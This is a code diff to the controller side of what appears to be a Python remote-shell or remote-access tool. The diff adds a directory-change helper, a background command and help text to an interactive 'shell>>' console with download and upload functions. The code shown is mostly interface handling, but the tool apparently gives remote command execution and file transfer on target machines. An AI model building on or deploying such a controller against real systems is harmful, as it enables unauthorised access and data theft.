@@ -43,6 +43,14 @@ def main_con():
 
 main_log = threading.Event()
 
+def cd(_target):
+    try:
+        _target.settimeout(5.0)
+        print(_target.recv(1024).decode())
+        _target.settimeout(None)
+    except:
+        cprint("[!] Can't receive the canged directory name", 'yellow')
+
 def start_log():
     cprint("[*] Starting logger", 'blue')
     time.sleep(0.5)
@@ -271,6 +279,8 @@ def shellc(_target):
     n = 0
     p = 0
     cprint("[!] Type 'help' for help", 'yellow')
+    cprint("[!] Use 'exit' to fully exit both server and client", 'yellow')
+    cprint("[!] Use 'bg' or 'background' to background the current shell", 'yellow')
     while True:
         try:
             perintah = input('shell>> ')
@@ -279,13 +289,13 @@ def shellc(_target):
             if perintah in('exit','quit'):
                 cprint('[!] Exiting', 'yellow')
                 exit()
+            elif perintah in ('background', 'bg'):
+                cprint('[+] Backgrounding the session...', 'green')
+                exit()
             elif perintah == 'clear':
                 os.system('cls')
             elif perintah[:3] == 'cd ':
-                try:
-                    print(_target.recv(1024).decode())
-                except:
-                    pass
+                cd(_target)
             elif perintah[:8] == 'download':
                 download_file(_target, perintah[9:])
             elif perintah[:6] == 'upload':
@@ -307,7 +317,9 @@ def shellc(_target):
                 cprint("""
                         basic command:
                     ================================
-                    -exit/quit >> exit
+                    -exit/quit >> exit the process
+
+                    -background >> background the process
                     
                     -clear     >> clear terminal
                     ================================
